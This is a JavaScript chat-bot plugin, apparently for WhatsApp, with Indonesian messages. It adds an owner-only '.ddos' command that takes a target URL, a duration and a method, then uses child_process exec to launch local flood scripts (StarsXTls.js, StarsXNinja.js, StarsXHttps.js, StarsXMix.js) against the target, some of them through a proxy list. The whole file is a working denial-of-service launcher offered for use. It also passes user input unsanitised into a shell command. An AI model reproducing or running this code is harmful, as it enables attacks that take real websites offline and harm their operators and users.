const fetch = require('node-fetch')
const axios = require('axios')
const { exec } = require('child_process');
const { promisify } = require('util');

const cooldowns = new Map();

const handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, 'Format salah!\nContoh: .ddos [url] [duration] [methods]', m);

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com', 'ureshii.my.id'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, 'Target di blacklist. Jangan coba coba ddos web itu!', m);
  }
  const target = args[0]
  const duration = args[1]
  const methods = args[2]
  const details = `
Hallow parhann sayangg!
Ddos nya udah ke send nih :3

> Target: ${target}
> Methods: ${methods}
> Durasi: ${duration}

Kalo mau chek host klik thumbnail ya syg..!
`

if ( methods === 'tls' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check host?, klik disini!`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/DDOS/StarsXTls.js ${target} ${duration} 100 10`)
} else if ( methods === 'ninja' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check host?, klik disini!`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/DDOS/StarsXNinja.js ${target} ${duration}`)
} else if ( methods === 'https' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check host?, klik disini!`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/DDOS/StarsXHttps.js ${target} ${duration} 10 100 proxy.txt`)
} else if ( methods === 'mix' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check host?, klik disini!`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/DDOS/StarsXMix.js ${target} ${duration} 100 10 proxy.txt`)
} else {
	m.reply(`Ups, method salah!`)
}
  }

handler.help = ['ddos'].map(v => v + ' <url> <duration>');
handler.tags = ['ddos'];
handler.rowner = true
handler.owner = true
handler.command = /^(ddos)$/i;
module.exports = handler
